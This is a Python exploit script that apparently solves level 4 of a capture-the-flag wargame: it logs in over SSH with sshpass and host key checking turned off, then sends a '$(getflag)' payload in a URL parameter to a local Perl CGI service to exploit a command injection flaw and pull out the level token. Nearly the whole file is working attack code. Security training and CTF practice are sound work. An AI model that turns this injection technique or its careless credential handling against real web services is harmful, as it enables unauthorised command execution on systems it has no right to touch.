"""Level04 Exploit - CGI Command Injection via SSH"""

import subprocess
import sys


def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            [
                "sshpass",
                "-p",
                pwd,
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-p",
                str(port),
                f"{user}@{host}",
                cmd,
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.returncode, result.stdout, result.stderr
    except:
        return -1, "", ""


def exploit_remote(host, port, ssh_port, level03_pwd):
    """Exploit via SSH."""
    print(f"[*] SSH to level04@{host}:{ssh_port}")

    print("[*] Testing SSH connectivity...")
    test_code, test_out, test_err = ssh_cmd(
        host, ssh_port, "level04", level03_pwd, "id"
    )
    if test_code != 0:
        print(f"[!] SSH connection failed")
        return False, ""
    print(f"[+] SSH OK: {test_out.strip()}")

    cmd = 'curl "http://localhost:4747/?x=$(getflag)"'
    print(f"[*] Executing: {cmd}")

    code, out, err = ssh_cmd(host, ssh_port, "level04", level03_pwd, cmd)

    if code == 0 and "token" in out.lower():
        print(f"[+] Success!\n{out}")
        token = out.split(":")[-1].strip()
        return True, token
    else:
        print(f"[!] Failed. Code: {code}")
        print(f"[!] Output: {out}")
        print(f"[!] Error: {err}")
        return False, ""


def exploit_local(host="localhost", port=4747):
    """Exploit locally."""
    print(f"[*] Target: http://{host}:{port}/")

    url = f"http://{host}:{port}/?x=$(getflag)"

    try:
        result = subprocess.run(
            ["curl", "-s", url], capture_output=True, text=True, timeout=5
        )

        output = result.stdout.strip()
        print(output)

        if "token" in output.lower():
            token = output.split(":")[-1].strip()
            return True, token
    except:
        pass
    return False, ""


def main():
    """Main function."""
    print("Level04 CGI Command Injection Exploit\n")

    print("[*] Reading level03 token from file...")
    try:
        with open("level03/flag", "r") as f:
            level03_pwd = f.read().strip()
        print(f"[+] Level03 token: {level03_pwd}\n")
    except:
        print("[!] Could not read level03 token")
        sys.exit(1)

    success, token = exploit_remote("localhost", 4747, 4242, level03_pwd)

    if success:
        print("\nVulnerability: Command injection in Perl backticks")
        print("Attack: Injected $(getflag) in URL parameter")
        print(f"Result: Executed with flag04 privileges")
        print(f"\n[+] Level04 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
